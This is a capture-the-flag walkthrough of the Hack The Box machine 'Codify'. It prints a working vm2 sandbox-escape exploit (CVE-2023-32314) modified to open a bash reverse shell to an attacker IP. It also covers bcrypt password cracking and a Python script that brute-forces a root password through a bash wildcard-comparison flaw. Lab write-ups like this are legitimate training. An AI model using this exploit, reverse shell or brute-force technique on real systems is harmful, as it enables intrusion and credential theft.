**Codify** is an easy HTB machine

## Reconnaissance
We are given an IP-address: 10.10.11.239

When using a basic `nmap` scan to find any open ports, we find the following results:
```
# Nmap 7.94SVN scan initiated Thu Mar  7 13:45:31 2024 as: nmap -sC -sV -oN initial.nmap 10.10.11.239
Nmap scan report for 10.10.11.239
Host is up (0.016s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We check out the webserver first and add the IP-address and the domain name to our /etc/hosts file using `sudo sh -c 'echo "10.10.11.239 codify.htb" >> /etc/hosts'`

Visiting the website, we see that it is a sandboxed environment for running NodeJS javascript code. We also read that the technology used is called vm2 and when following the link we find that the version is 3.9.16. 

## Initial foothold

When googling for known exploits on vm2, we come accross [CVE-2023-32314](https://security.snyk.io/vuln/SNYK-JS-VM2-5537100), a vulnerability that allows RCE on the machine hosting the vm2 service. The source includes a POC; we alter it and make the payload a reverse shell:

```javascript
const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("bash -c 'bash -i >& /dev/tcp/10.10.14.4/1234 0>&1'").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
```

Running this code on the codify.htb website with an `nc` instance listening on port 1234 indeed gives us a reverse shell as the user svc.

## Horizontal escalation
Listing the users in /etc/passwd tells us there is one (human) user account with the name joshua. 

Looking around in the home directory of the 'svc', where the source files for the javascript interpreter are found, we cannot find any credentials. Since the machine is hosting a webserver we can look at the /var/www/ directory for credentials as well. In there we indeed come across the source files for the website, containing html and js code. In the /var/www/contacts directory we also find a sqlite3 database file called tickets.db, which is probably the database that the website maintainers are migrating a ticket-system to (this was mentioned on the website as well). Opening it up with `sqlite3` we find that it contains a users table and in it we find the credentials 'joshua'::'$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2'.

The password is obviously hashed, so we use `john` and the rockyou.txt password list to try and crack it. `john` recognizes the has to be of the bcrypt type and finds the password 'spongebob1' soon. Using `su` we find that this 'spongebob1' is also the password for his user account on the machine. We now have the user.txt flag.

## Escalation to root
Using `sudo -l` we see that joshua is allowed to run the /opt/scripts/mysql-backup.sh bash script as root. It is a script that backs up all of the mysql databases for the user root. While that functionality itself is of no use, the script contains the following snippet of code:

```bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
<...>
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
if [[ $DB_PASS == $USER_PASS ]]
```

It uses `[[ $DB_PASS == $USER_PASS ]]` incorrectly because the right term should have double quotes surrounding it. Now it will patternmatch against the right term instead of doing a string comparison. See [source](https://mywiki.wooledge.org/BashPitfalls#if_.5B.5B_.24foo_.3D_.24bar_.5D.5D_.28depending_on_intent.29) for more info. Because of the patternmatching, we can use a wildcard `*` in the password, which will always match. Again, the script itself and its functionality is of no use, but we can use this approach to figure out the root password.

We write a script that incrementally adds a new character infront of `*` and if the script accepts, we add it to the characters we already know and start adding a new character. We keep doing this until no character matches anymore, at which point we've found the entire password. 

```python
import subprocess

def run_command(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
    output, error = process.communicate()
    return output.decode('utf-8')

pwd = ""
chars = [chr(i) for i in range(48, 58)] + [chr(i) for i in range(65, 91)] + [chr(i) for i in range(97, 123)] # alphanumerical

while True:
    for char in chars:
        cmd = f"echo '{pwd}{char}*' | sudo ./myswl-backup.sh"
        output = run_command(cmd)
        if "confirmed" in output:
            pwd += char
            print(f"Password: {pwd}")
```

With this approach we find the password 'kljh12k3jhaskjh12kjh3'. We log in as the root user and get the root flag in /root/root.txt